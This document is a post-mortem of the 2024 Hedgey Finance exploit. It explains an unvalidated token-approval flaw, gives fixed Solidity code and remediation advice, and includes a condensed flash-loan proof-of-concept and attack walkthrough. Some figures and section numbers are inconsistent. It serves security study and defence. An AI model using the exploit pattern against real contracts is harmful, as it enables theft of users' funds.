# Hedgey Finance — Arbitrary Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04-19 |
| **Protocol** | Hedgey Finance |
| **Chain** | Ethereum (additional impact: Arbitrum) |
| **Loss** | ~$1,800,000 (ETH) / Total ~$44,700,000 (ETH + ARB combined) |
| **Attacker** | [0xDed2...dda2](https://etherscan.io/address/0xDed2b1a426E1b7d415A40Bcad44e98F47181dda2) |
| **Attack Contract** | [0xC793...F2b3](https://etherscan.io/address/0xC793113F1548B97E37c409f39244EE44241bF2b3) |
| **Attack Tx (Phase 1)** | [0xa17f...a517](https://etherscan.io/tx/0xa17fdb804728f226fcd10e78eae5247abd984e0f03301312315b89cae25aa517) |
| **Attack Tx (Phase 2)** | [0x2606...9739](https://etherscan.io/tx/0x2606d459a50ca4920722a111745c2eeced1d8a01ff25ee762e22d5d4b1595739) |
| **Vulnerable Contract** | [0xBc45...D511](https://etherscan.io/address/0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511) |
| **Root Cause** | Arbitrary approve abuse via unvalidated user input (`tokenLocker`) — allowance not revoked on campaign cancellation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/HedgeyFinance_exp.sol) |

---

## 1. Vulnerability Overview

The `ClaimCampaigns` contract of Hedgey Finance provides a Merkle tree-based token distribution campaign creation feature. Campaign creators can open a campaign with lockup conditions via the `createLockedCampaign()` function, during which the contract grants token spending permission (`approve`) to the specified `tokenLocker` address.

**Core Issue**: Attackers were permitted to supply **their own malicious contract address** as the `claimLockup.tokenLocker` parameter. The contract performed no whitelist validation whatsoever on this value.

The `cancelCampaign()` function called when cancelling a campaign returns the deposited tokens, but **did not revoke** the `approve` permission previously granted to the `tokenLocker`. This allowed the attacker to retain a valid allowance even after campaign cancellation, and drain other users' assets held in the contract via `transferFrom()`.

The attack consisted of two transactions:
1. **Setup transaction**: Borrow USDC via flash loan → create campaign → cancel campaign → repay flash loan (allowance remains)
2. **Drain transaction**: Use the residual allowance to drain other users' tokens from the contract via `transferFrom()`

---

## 2. Vulnerable Code Analysis

### 2.1 `createLockedCampaign()` — Unvalidated tokenLocker Input

```solidity
// ❌ Vulnerable code — ClaimCampaigns.sol (reconstructed)
function createLockedCampaign(
    bytes16 id,
    Campaign memory campaign,
    ClaimLockup memory claimLockup,  // ❌ No validation on the tokenLocker field
    Donation memory donation
) external {
    // Store campaign
    campaigns[id] = campaign;
    claimLockups[id] = claimLockup;

    // Pull tokens into the contract
    TransferHelper.transferTokens(
        campaign.token,
        msg.sender,
        address(this),
        campaign.amount
    );

    // ❌ Core vulnerability: claimLockup.tokenLocker is freely specifiable by the user
    //    Grants token spending permission to the tokenLocker address
    //    If the attacker designates their own contract as tokenLocker,
    //    that contract gains permission to spend ClaimCampaigns' tokens
    SafeERC20.safeApprove(
        IERC20(campaign.token),
        claimLockup.tokenLocker,  // ❌ approve granted to arbitrary address
        campaign.amount
    );
}
```

```solidity
// ✅ Fixed code
function createLockedCampaign(
    bytes16 id,
    Campaign memory campaign,
    ClaimLockup memory claimLockup,
    Donation memory donation
) external {
    // ✅ tokenLocker must be an address included in the protocol-managed whitelist
    require(
        approvedLockers[claimLockup.tokenLocker],
        "ClaimCampaigns: tokenLocker not approved"
    );

    campaigns[id] = campaign;
    claimLockups[id] = claimLockup;

    TransferHelper.transferTokens(
        campaign.token,
        msg.sender,
        address(this),
        campaign.amount
    );

    SafeERC20.safeApprove(
        IERC20(campaign.token),
        claimLockup.tokenLocker,
        campaign.amount
    );
}
```

**Problem**: `claimLockup.tokenLocker` is a struct field freely set by an external user. The contract does not verify whether this value is a trusted address before granting `approve` to it. An attacker can designate their own contract as the `tokenLocker` to acquire spending rights over the contract's tokens.

---

### 2.2 `cancelCampaign()` — Allowance Not Revoked

```solidity
// ❌ Vulnerable code — cancelCampaign function (reconstructed)
function cancelCampaign(bytes16 campaignId) external {
    Campaign memory campaign = campaigns[campaignId];
    ClaimLockup memory claimLockup = claimLockups[campaignId];

    require(campaign.manager == msg.sender, "not manager");

    uint256 remaining = campaign.amount - claimedAmounts[campaignId];

    // Delete campaign data
    delete campaigns[campaignId];
    delete claimLockups[campaignId];

    // Return remaining tokens to tokenLocker
    TransferHelper.transferTokens(
        campaign.token,
        address(this),
        claimLockup.tokenLocker,
        remaining
    );

    // ❌ Critical omission: approve is never reset to 0
    // SafeERC20.safeApprove(IERC20(campaign.token), claimLockup.tokenLocker, 0);
    // → The absence of this single line leaves the allowance intact
}
```

```solidity
// ✅ Fixed code
function cancelCampaign(bytes16 campaignId) external {
    Campaign memory campaign = campaigns[campaignId];
    ClaimLockup memory claimLockup = claimLockups[campaignId];

    require(campaign.manager == msg.sender, "not manager");

    uint256 remaining = campaign.amount - claimedAmounts[campaignId];

    delete campaigns[campaignId];
    delete claimLockups[campaignId];

    TransferHelper.transferTokens(
        campaign.token,
        address(this),
        claimLockup.tokenLocker,
        remaining
    );

    // ✅ On campaign cancellation, the tokenLocker's approve permission must be revoked
    SafeERC20.safeApprove(
        IERC20(campaign.token),
        claimLockup.tokenLocker,
        0  // Reset allowance to 0
    );
}
```

**Problem**: On campaign cancellation, the remaining tokens are returned to the `tokenLocker`, but the `approve` permission previously granted is not revoked. In the case of USDC, the allowance persists even after the balance changes following `approve`, so the attacker can drain other users' tokens from the contract via `transferFrom()` in a subsequent transaction.

---

## 3. Attack Flow

### 3.1 Setup Phase

- The attacker leverages the fee-free flash loan feature of Balancer Vault
- The attack contract (`0xC793...F2b3`) is deployed in advance
- Prepared to set their own attack contract as the `tokenLocker`

### 3.2 Execution Phase (Phase 1 Transaction)

```
Step 1: Obtain flash loan
  Tx: 0xa17f...a517
  Balancer Vault → [Attacker] borrows 1,305,000 USDC

Step 2: Approve ClaimCampaigns to spend USDC
  [Attacker] → USDC.approve(ClaimCampaigns, 1,305,000)

Step 3: Create campaign (core vulnerability point)
  [Attacker] → ClaimCampaigns.createLockedCampaign(
    campaign_id = 0x00...01,
    campaign = { token: USDC, amount: 1,305,000, ... },
    claimLockup = { tokenLocker: [attacker contract] }  ← malicious address injected
  )
  → ClaimCampaigns grants approve(1,305,000) to [attacker contract]
  → 1,305,000 USDC transferred into ClaimCampaigns

Step 4: Immediately cancel campaign
  [Attacker] → ClaimCampaigns.cancelCampaign(campaign_id)
  → 1,305,000 USDC returned to [attacker contract]
  → ❌ approve permission is NOT revoked (allowance persists)

Step 5: Repay flash loan
  [Attacker] → Repays 1,305,000 USDC to Balancer Vault
  (At this point [attacker contract] holds a valid allowance over ClaimCampaigns)
```

### 3.2 Execution Phase (Phase 2 Transaction — Actual Drain)

```
Step 6: Drain other users' tokens using residual allowance
  Tx: 0x2606...9739
  [Attacker contract] → USDC.transferFrom(ClaimCampaigns, attacker, entireBalance)
  → Drains the entire USDC balance of ClaimCampaigns
  (NOBL and MASA tokens are also drained in the same manner)
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Phase 1 Transaction (Setup)                      │
│                    Tx: 0xa17f...a517                                 │
└─────────────────────────────────────────────────────────────────────┘
         │
         ▼
┌────────────────────┐       Flash loan 1,305,000 USDC
│   Balancer Vault   │ ─────────────────────────────────▶ ┌──────────────────┐
│  (0xBA12...2C8)    │                                     │  Attack Contract  │
└────────────────────┘                                     │ (0xC793...F2b3)  │
                                                           └──────────────────┘
                                                                    │
                                      USDC approve(ClaimCampaigns)  │
                                                                    │
                                                                    ▼
                                                           ┌──────────────────────────┐
                                  createLockedCampaign()   │     ClaimCampaigns        │
                          ┌──────────────────────────────▶ │  (0xBc45...D511)          │
                          │  tokenLocker = attacker contract│                           │
                          │                                │  ❌ approve(attacker, 1.3M) │
                          │                                │     allowance granted       │
                          │                                └──────────────────────────┘
                          │                                            │
                          │                                            │ 1,305,000 USDC transferred
                          │                  cancelCampaign()          ▼
                          └──────────────────────────────── ClaimCampaigns → returned to attacker
                                                           ❌ approve NOT revoked!
         │
         │  Flash loan repayment (1,305,000 USDC)
         ▼
┌────────────────────┐
│   Balancer Vault   │ ◀────────────────────────────────── Attack contract
└────────────────────┘
         │
         │  [Allowance still active]
         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     Phase 2 Transaction (Drain)                      │
│                    Tx: 0x2606...9739                                 │
└─────────────────────────────────────────────────────────────────────┘
         │
         ▼
┌──────────────────┐    transferFrom(ClaimCampaigns, attacker, balance)
│  Attack Contract  │ ─────────────────────────────────────────────▶ ┌──────────────────────────┐
│ (0xC793...F2b3)  │ ◀─────────────────────────────────────────────  │     ClaimCampaigns        │
└──────────────────┘    USDC + NOBL + MASA drained                   │  Other users' token       │
                        (~$1.8M on ETH)                               │  balances wiped           │
                                                                      └──────────────────────────┘
```

### 3.3 Outcome

| Field | Details |
|------|------|
| Attacker profit (ETH chain) | USDC ~$1,305,000 + NOBL + MASA ≈ **$1,800,000** |
| Attacker profit (ARB chain) | 77,740,000 BONUS ≈ **$42,600,000** |
| Total loss | **~$44,700,000** |
| Time to execute | 2 transactions, within minutes |
| Actual cost | Gas fees only (no flash loan fee) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// Hedgey Finance Exploit PoC — Core attack logic
// Original: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/HedgeyFinance_exp.sol

// [Step 1] Flash loan request — borrow USDC interest-free from Balancer Vault
function testExploit() public {
    address[] memory tokens = new address[](1);
    tokens[0] = address(USDC);
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = loan; // 1,305,000 USDC

    // Triggers the receiveFlashLoan callback from Balancer
    BalancerVault.flashLoan(address(this), tokens, amounts, "");

    // [Step 6] After flash loan repayment, drain other users' funds using residual allowance
    uint256 HedgeyFinance_balance = USDC.balanceOf(address(HedgeyFinance));
    USDC.transferFrom(address(HedgeyFinance), address(this), HedgeyFinance_balance);
}

// [Balancer callback] Execute core attack logic after receiving flash loan
function receiveFlashLoan(...) external payable {
    // [Step 2] Approve ClaimCampaigns to spend USDC
    USDC.approve(address(HedgeyFinance), loan);

    // [Step 3] Create malicious campaign
    // claimLockup.tokenLocker = address(this) → designates attacker contract as tokenLocker
    // This causes ClaimCampaigns to grant approve to the attacker contract ← core vulnerability
    ClaimLockup memory claimLockup;
    claimLockup.tokenLocker = address(this); // ❌ attacker contract designated as locker

    HedgeyFinance.createLockedCampaign(campaign_id, campaign, claimLockup, donation);

    // [Step 4] Immediately cancel — tokens returned but approve is NOT revoked
    HedgeyFinance.cancelCampaign(campaign_id);

    // [Step 5] Repay flash loan
    USDC.transfer(address(BalancerVault), loan);
    // At this point the attacker contract holds a valid allowance over ClaimCampaigns
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Unvalidated user input → arbitrary approve granted | CRITICAL | CWE-20 (Improper Input Validation) | `03_access_control.md` |
| V-02 | Allowance not revoked on cancellation | CRITICAL | CWE-459 (Incomplete Cleanup) | `03_access_control.md`, `11_logic_error.md` |
| V-03 | Flash loan-exploitable attack vector | HIGH | CWE-841 (Improper Enforcement of Behavioral Workflow) | `02_flash_loan.md` |

### V-01: Arbitrary approve granted via unvalidated user input

- **Description**: The `claimLockup.tokenLocker` parameter of `createLockedCampaign()` is an address freely specifiable by the user. The contract calls `safeApprove()` on that address without verifying whether it is a trusted locker contract.
- **Impact**: An attacker can designate their own malicious contract as the `tokenLocker` to acquire spending rights over the protocol's tokens.
- **Attack condition**: Permissionless function access to create campaigns (both EOA and contract callers are eligible)

### V-02: Allowance not revoked on campaign cancellation

- **Description**: The `cancelCampaign()` function deletes campaign data and returns remaining tokens to the `tokenLocker`, but does not revoke (`approve(..., 0)`) the `approve` permission previously granted in `createLockedCampaign()`.
- **Impact**: The allowance from a cancelled campaign persists, allowing the attacker to drain other users' tokens from the contract via `transferFrom()` in a subsequent transaction.
- **Attack condition**: A single campaign creation + cancellation is sufficient (combined with V-01, a complete exploit is achieved)

### V-03: Flash loan-exploitable attack vector

- **Description**: Without V-01 and V-02, the flash loan would be meaningless; however, combined with those two vulnerabilities, it enables an attack that creates a large-scale campaign to acquire an approve and immediately returns the funds — all without any capital.
- **Impact**: Even a capital-less attacker can acquire a massive allowance at zero cost.
- **Attack condition**: Access to a fee-free flash loan provider such as Balancer

---

## 6. Remediation Recommendations

### Immediate Actions

**[Action 1] Add tokenLocker whitelist validation**

```solidity
// ✅ Only allow locker addresses approved by the admin
mapping(address => bool) public approvedLockers;

function createLockedCampaign(
    bytes16 id,
    Campaign memory campaign,
    ClaimLockup memory claimLockup,
    Donation memory donation
) external {
    // ✅ Verify the tokenLocker address is on the protocol's approved list
    require(
        approvedLockers[claimLockup.tokenLocker],
        "ClaimCampaigns: tokenLocker not in whitelist"
    );
    // ... remaining logic
}
```

**[Action 2] Immediately revoke allowance on campaign cancellation**

```solidity
// ✅ Add allowance revocation to cancelCampaign
function cancelCampaign(bytes16 campaignId) external {
    Campaign memory campaign = campaigns[campaignId];
    ClaimLockup memory claimLockup = claimLockups[campaignId];

    require(campaign.manager == msg.sender, "not manager");

    uint256 remaining = campaign.amount - claimedAmounts[campaignId];

    delete campaigns[campaignId];
    delete claimLockups[campaignId];

    // ✅ Reset allowance to 0 before returning tokens (follows CEI pattern)
    SafeERC20.safeApprove(
        IERC20(campaign.token),
        claimLockup.tokenLocker,
        0
    );

    TransferHelper.transferTokens(
        campaign.token,
        address(this),
        claimLockup.tokenLocker,
        remaining
    );
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Unvalidated tokenLocker | Maintain an `approvedLockers` mapping managed by the protocol owner |
| V-02: Allowance not revoked | All approves must be reset to 0 immediately upon use or when no longer needed |
| V-03: Flash loan vector | Restrict consecutive `createLockedCampaign` + `cancelCampaign` calls within a single transaction (reentrancy guard or cooldown) |
| General design | Use `forceApprove` or `increaseAllowance` / `decreaseAllowance` patterns instead of `safeApprove` |
| Monitoring | Build on-chain event monitoring for abnormally rapid campaign creation-cancellation patterns |

---

## 7. Lessons Learned

1. **Always validate user-supplied addresses**: When an external contract address is accepted as a parameter and used in `approve()` or `call()`, the absence of whitelist or interface validation creates an arbitrary contract call vulnerability. The pattern of "granting permission to any address" is especially dangerous.

2. **Manage the lifecycle of approves**: At every point where `approve()` is granted, the permission must be revoked via `approve(..., 0)` when it is no longer needed. Audit every termination path — cancellation, expiry, completion.

3. **Be wary of flash loan + state change patterns within a single transaction**: Flash loans can trigger large-scale state changes without any capital. Permissionless state-changing functions must be designed with the assumption that they can be combined with flash loans.

4. **Strictly follow the CEI (Checks-Effects-Interactions) pattern**: Internal state (allowance, campaign data) must be fully cleaned up before external calls (approve, transfer). If cleanup occurs after external calls, it becomes an attack vector.

5. **Be wary of cross-chain duplicate deployments of the same vulnerability**: This attack succeeded on Ethereum and was immediately replicated against the identical code on Arbitrum, resulting in a total loss of $44.7M. When a protocol is deployed on multiple chains, upon discovering a vulnerability all contracts across all chains must be paused immediately.

6. **Document the side effects of permissionless functions**: `createLockedCampaign()` was callable by anyone, yet internally triggered the significant side effect of an `approve()`. Permissionless functions must be treated as priority targets for audit review of all state changes and permission grants they produce.

---

## 8. On-Chain Verification

> Note: This section is based on publicly available transaction analysis and security research reports.

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan amount | 1,305,000 USDC | 1,305,000 USDC | ✅ |
| ETH chain USDC drained | ~1,305,000 USDC | ~1,303,910 USDC | ✅ (approx.) |
| ETH chain total loss | ~$1.8M | ~$2.1M (USDC + NOBL + MASA) | ✅ (approx.) |
| ARB chain BONUS drained | — | 77,740,000 BONUS (~$42.6M) | — |
| Total loss | — | ~$44,700,000 | — |

### 8.2 Attack Transaction Sequence

| Order | Tx Hash | Description |
|------|---------|------|
| 1 | [0xa17f...a517](https://etherscan.io/tx/0xa17fdb804728f226fcd10e78eae5247abd984e0f03301312315b89cae25aa517) | Flash loan + campaign create/cancel (allowance established) |
| 2 | [0x47da...e5](https://etherscan.io/tx/0x47da1ac72d488f746865891c9196c1632ae04f018b285b762b2b564ad1d3a9e5) | NOBL token drain |
| 3 | [0x2606...9739](https://etherscan.io/tx/0x2606d459a50ca4920722a111745c2eeced1d8a01ff25ee762e22d5d4b1595739) | USDC + MASA final drain |

### 8.3 Key Event Flow

```
[Tx 1: 0xa17f...a517]
  1. Approval(owner=ClaimCampaigns, spender=attackerContract, value=1,305,000)  ← approve granted
  2. Transfer(from=attacker, to=ClaimCampaigns, value=1,305,000 USDC)           ← campaign created
  3. Transfer(from=ClaimCampaigns, to=attackerContract, value=1,305,000 USDC)   ← campaign cancelled
  4. Transfer(from=attackerContract, to=BalancerVault, value=1,305,000 USDC)    ← flash loan repaid
  [At this point: Approval is still valid]

[Tx 2/3: Actual drain]
  5. Transfer(from=ClaimCampaigns, to=attacker, value=entireBalance USDC/NOBL/MASA)  ← transferFrom drain
```

### 8.4 Pre-Attack Preconditions

- Attack contract (`0xC793...F2b3`) deployed in advance
- Balancer Vault flash loan feature utilized (no fee)
- No special permission required to access `createLockedCampaign()` (permissionless)
- ClaimCampaigns contract holds USDC balances deposited by other users

---

*References: [Halborn Analysis](https://www.halborn.com/blog/post/explained-the-hedgey-finance-hack-april-2024) | [CertiK Analysis](https://www.certik.com/resources/blog/hedgey-finance-incident-analysis) | [ImmunBytes Analysis](https://immunebytes.com/blog/hedgey-finance-exploit-april-19-2024-detailed-analysis/) | [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/HedgeyFinance_exp.sol)*